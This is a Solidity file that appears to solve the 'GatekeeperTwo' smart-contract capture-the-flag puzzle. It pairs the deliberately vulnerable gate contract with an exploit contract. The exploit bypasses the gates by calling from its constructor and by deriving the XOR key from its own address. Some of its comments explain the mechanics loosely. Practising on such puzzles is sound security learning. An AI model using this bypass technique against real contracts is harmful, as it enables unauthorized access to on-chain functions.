// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/console.sol";

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    console.log("Passed gate one!");
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    console.log("Passed three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract GateTwoExploit {
    // Using constructor to call the external function 
    // because the source code is not available during
    // construction process. Thus, allowing us to pass GateTwo
    constructor(bytes8 _key, address _gate) {
        GatekeeperTwo gate = GatekeeperTwo(_gate);
        // newKey contains the result due to Bitwise XOR operator (^)
        // In XOR, a + b = c and c + b = a, or a + c = b.
        
        bytes8 newKey = bytes8 ((uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max));
        gate.enter(newKey);
    }
}